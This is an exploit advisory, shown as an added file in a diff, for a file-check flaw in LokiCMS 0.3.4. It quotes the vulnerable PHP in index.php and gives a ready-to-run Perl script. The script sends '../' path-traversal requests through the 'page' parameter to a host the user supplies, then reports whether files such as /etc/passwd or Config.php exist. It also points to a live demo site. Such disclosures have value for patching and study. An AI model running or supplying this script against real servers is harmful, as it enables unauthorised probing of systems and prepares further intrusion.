@@ -1,0 +1,120 @@
+# LokiCMS <= 0.3.4 (index.php page) Arbitrary Check File Exploit
+# url: http://www.lokicms.com/
+#
+# Author: JosS
+# mail: sys-project[at]hotmail[dot]com
+# site: http://spanish-hackers.com
+# team: Spanish Hackers Team - [SHT]
+#
+# This was written for educational purpose. Use it at your own risk.
+# Author will be not responsible for any damage.
+#
+# Greetz To: All Hackers and milw0rm website
+
+vulnerability:
+The vulnerability allows to verify the existence of the files and directories around the server.
+/etc/passwd (example)
+
+vuln file: index.php
+vuln code:
+------------------------------------------------
+if ( isset ( $_GET ) && isset ( $_GET['page'] ) ) $pagename = stripslashes ( trim ( $_GET['page'] ) );
+
+
+
+// load the page
+
+if ($pagename == '') {
+
+	$name = $c_default;
+
+	$nosimple = true;
+
+} else {
+
+	$name = $pagename;
+
+};
+
+
+
+if ($c_simplelink == true && $nosimple != true) {
+
+	$content = findpage($name);
+
+	if ($content == "") {$content = $c_default;};
+
+} else {
+
+	$content = $name;
+
+};
+
+
+
+// stupid fix due to subdomain problems
+
+if ($c_modrewrite != true && $pagename != '') {if (file_exists(PATH . "/pages/" . $content) == false) {$content = $c_default;};};
+
+
+
+// load the menu
+
+$menu = getmenu($content, $c_modrewrite, $c_simplelink);
+
+
+
+$content = parsepage($content);
+------------------------------------------------
+
+use strict;
+use LWP::UserAgent;
+
+sub lw
+{
+
+my $SO = $^O;
+my $linux = "";
+if (index(lc($SO),"win")!=-1){
+		   $linux="0";
+	    }else{
+		    $linux="1";
+	    }
+		if($linux){
+system("clear");
+}
+else{
+system("cls");
+}
+
+}
+
+&lw;
+
+print "#################################################################\n";
+print "#  LokiCMS 0.3.4 (index.php page) Arbitrary Check File Exploit  #\n";
+print "#################################################################\n";
+
+my $victim = $ARGV[0];
+my $file = $ARGV[1];
+
+ if((!$ARGV[0]) && (!$ARGV[1])) {
+    print "\n[x] LokiCMS 0.3.4 (index.php page) Arbitrary Check File Exploit\n";
+    print "[x] written by JosS - sys-project[at]hotmail.com\n";
+    print "[x] usage: perl xpl.pl [host] [file]\n";
+    print "[x] example: http://localhost/loki/ /includes/Config.php\n\n";
+    exit(1);
+ }
+ 
+    print "\n[+] connecting: $victim\n";
+    my $cnx = LWP::UserAgent->new() or die;
+    my $go=$cnx->get($victim."index.php?page=../$file");
+    if ($go->content =~ m/LokiCMS/ms) {
+        print "[-] The file not exist\n\n";
+    } else {
+        print "[!] The file exist: $file\n\n";
+    }
+
+# live demo: http://demo.opensourcecms.com/lokicms/
+
+# milw0rm.com [2008-10-12]
